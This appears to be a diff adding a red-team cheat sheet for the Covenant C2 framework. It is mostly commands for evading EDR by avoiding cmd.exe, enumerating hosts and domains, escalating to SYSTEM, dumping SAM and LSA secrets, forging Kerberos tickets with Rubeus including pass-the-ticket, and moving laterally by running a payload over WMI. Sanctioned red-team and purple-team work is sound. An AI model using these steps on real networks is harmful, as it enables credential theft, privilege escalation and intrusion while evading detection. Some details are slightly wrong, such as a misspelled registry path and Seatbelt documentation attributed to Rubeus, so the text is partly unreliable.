@@ -1,0 +1,69 @@
+When performing testing on a Red Team attack simulation or Purple Team engagement, the main focus is stealth. In keeping with that desired level of Operational Security (OpSec) when working through a Command and Control framework, it's desireable to be able to perform common attack steps without invoking the Windows command line interpreter cmd.exe. Many AV/EDR solutions monitor this and will begin flagging and scrutinizing hosts that suddenly start showing an uptick in this activity. Here is a list of commands that accomplish common penetration testing tasks within Covenant C2 without invoking cmd.exe, including the "net" command:
+
+First, most command line operations can be performed without invoking cmd.exe using Covenant's "PowerShell" command. Simply type your command after "PowerShell".
+
+For example, to query the startup entries in the resistry:
+  PowerShell reg query HKLM\Software\Microsoft\Windows\CurrenVersion\Run
+
+** Listing files on remote drive:
+  ListDirectory <Path>
+
+** Testing access to a host or drive share:
+  ListDirectory \\host\drive
+
+** Mapping a network share:
+  Powershell New-PSDrive –Name “<drive letter>” –PSProvider FileSystem –Root “\\host\share” -Persist
+  
+  **If you need to authenticate to access the share using known credentials, use Rubeus to get a Kerberos ticket for the desired user first.
+
+** Copying files between folders or mapped drives:
+  Use the Covenant built in copy command
+  Copy <source> <destination>
+
+** To upload files from local drive to remote target:
+  Upload /filepath:"C:\Temp" - NOTE: Covenant will pop up a dialogue box asking you to select the file you wish to upload
+  
+** To download files from a remote target to your local drive:
+  Download <file>
+
+** To enumerate host information:
+  Seatbelt -group=all (Or select specific test groups one at a time as desired. See Rubeus documentation for more info.)
+  
+** To enumerate privilege escalation possibilities:
+  SharpUp audit
+
+** Escalation - If you have a high integrity context, you can likely elevate your privileges to SYSTEM:
+  GetSystem
+  
+** Credential dumping
+  SamDump
+  LsaSecrets
+
+** To enumerate domain information:
+  Users: GetDomainUser
+  Groups: GetDomainGroup
+  Computers: GetDomainComputer
+  
+  NOTE: These commands are aliases for PowerView's commands and have options to further narrow the scope of the search if needed. Consult documentation for PowerView for details. Also, if these return errors or no data, or it just looks not right, you can do the same thing using SharpView, a C# port of PowerView. Download or compile SharpView.exe and execute it via Covenants "Assembly" command. 
+
+** Enumerate available Kerberos tickets:
+  Rubeus triage
+  Rubeus klist
+
+** Get a Kerberos token for a specific user using captured credentials (Cleartext password OR NTLM hash):
+  This command requires the NTLM hash of a user's password. If you only know the cleartext password, get the NTLM hash using Rubeus:
+  
+  Rubeus.exe hash /password:<password>
+  
+  Once you have the NTLM hash, request the Ticket Granting Ticket using Rubeus' asktgt function:
+  
+  Rubeus asktgt /user:<username> /rc4:<NTLM Hash> /domain:<domain>
+  
+  If you need to apply the ticket to your current session, tack "/ptt" onto the end to perform a "Pass-the-Ticket" attack.
+  
+  Once you have the output, you will have the ticket in Base64. This can be used in other Rubeus functions for further exploitation.
+  
+** To execute a payload on a remote host for lateral movement, first host your payload somewhere it can be accessed by the target user and host such as a shared network drive that most employees have access to, or a drive share you created on your foothold host and made available to everyone. The use WMIcommand to execute it. You will need credentials that are valid on the target host:
+
+  WMICommand /computername:"<hostname or IP>" /command:"cmd.exe /c <Path to hosted payload>" /username:"<user>" /password:"<password>"
+
